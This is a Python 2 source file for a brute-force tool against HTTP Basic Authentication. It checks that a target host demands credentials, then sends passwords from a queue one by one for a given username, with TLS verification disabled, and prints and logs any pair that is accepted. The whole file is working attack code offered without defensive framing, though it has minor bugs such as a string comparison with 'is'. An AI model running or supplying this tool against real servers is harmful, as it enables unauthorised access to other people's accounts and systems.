#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests

from termcolor import colored
from log import Log

class Basic_Auth(object):

    def __init__(self):
        pass

    def validate(self, target, port, method):

        url = "%s:%s" % (target, port)

        try:
            if method == "https":
                validation = requests.get('https://' + url, verify=False, timeout=5)

                if validation.status_code == 200:
                    print colored("[X] UNABLE TO CONNECT ", 'red', attrs=['bold'])
                    return False
                else:
                    return True

            else:
                validation = requests.get('http://' + url, timeout=5)

                if validation.status_code == 200:
                    print colored("[X] UNABLE TO CONNECT ", 'red', attrs=['bold'])
                    return False
                else:
                    return True

        except:
            print colored("[X] UNABLE TO CONNECT ", 'red', attrs=['bold'])
            return False



    def brute_force(self, target, port, username, passwords, method):

        uri = "%s:%s" % (target, port)

        print ""
        print colored("==========================[STARTING TEST]==========================", 'yellow', attrs=['bold'])
        print colored("STARTING BASIC AUTH TEST ON HOST: %s", 'blue', attrs=['bold']) % (uri)
        print ""

        if self.validate(target, port, method):

            i = 0

            while not passwords.empty():
                i = i + 1

                password = passwords.get()

                print  colored('[%s]         USER[%s]          PASS [%s]', 'yellow') % (i, username, password)

                if self.attack(target, port, username, password, method):

                    print ""
                    print colored("==========================[LOGIN FOUND]==========================", 'yellow',
                                  attrs=['bold'])
                    print ""
                    print colored("===================================================================", 'yellow',
                                  attrs=['bold'])
                    print colored("               [  :: USER[%s] AND PASS[%s]  ]                      ", 'green',
                                  attrs=['bold']) % (username, password)
                    print colored("===================================================================", 'yellow',
                                  attrs=['bold'])

                    return True




    def attack(self, target, port, username, password, method):

        uri = "%s:%s" % (target, port)

        try:
            if method is "https":
                test = requests.get('https://' + uri ,auth=(username, password), verify=False, timeout=8)
            else:
                test = requests.get('http://' + uri, auth=(username, password), timeout=8)
        except:
            pass

        code = test.status_code

        if code == 200:
            Log.found(target, port, username, password, method)
            return True
        else:
            return False